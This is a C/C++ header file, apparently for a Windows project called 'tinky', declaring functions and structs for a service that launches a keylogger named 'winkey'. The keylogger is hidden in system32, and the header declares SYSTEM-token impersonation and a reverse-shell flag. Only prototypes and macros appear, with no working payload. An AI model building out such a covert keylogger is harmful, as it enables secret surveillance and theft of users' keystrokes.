#pragma once

#define UNICODE // Keep ?
#define _UNICODE // Keep ?

//#include "winMandatory.h"
#include <windows.h>
#include <iostream>

//#include "unicode.h"

// =============== Magic variables ========== //
#define PROCESSES_STOP TEXT("Global\\stop_tinky_processes")  // NameSpace Global ?
#define SVC_NAME TEXT("svc")
#define KYLG_NAME TEXT("winkey")
#define HIDING_PATH TEXT("C:\\Windows\\system32\\winkey.exe")
// global {
#define NO_ARGS NULL
#define NO_NAME NULL
#define NONE 0
#define FAILURE 0
#define SUCCESS 1
// }
// main() {
#define NFUNC 0x4
// }
// ============================================= //

// =============== Structs =============== //
typedef struct processes {
	HANDLE					stopEventHandle;
	HANDLE					systemToken;

	STARTUPINFOW			winkeyStartupInfo;
	PROCESS_INFORMATION		winkeyProcessInfo;

}	processes_t;

typedef struct tinky {
	// install {
	SC_HANDLE	scmHandler;
	SC_HANDLE	serviceHandler;
	// }

	// Global {
	char	*winkeyExePath;
	char	*tinkyExePath;
	// }

	// start {
	SERVICE_STATUS			svcStatus;
	SERVICE_STATUS_HANDLE	svcStatusHandle;
	HANDLE					tinkyStopEventHandle;
	// }
}	tinky_t;
// ============================================= //

// process.cpp //
#define REVERSE_SHELL 1
BYTE launchProcess(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors);
// =============== serviceControlManaged =============== //
int startedBySCM(void);
// =============== cmdLineControlManaged.cpp =============== //
BYTE initControl(void);
// =============== impersonate.cpp =============== //
void impersonate(void);
// =============== install.cpp =============== //
int openSCM(DWORD desiredAccess);
int install(void);
// =============== start.cpp =============== //
int start(void);
// =============== stop.cpp =============== //
int stop(void);
// =============== delete.cpp =============== //
int uninstall(void); /* delete() was taken..lol */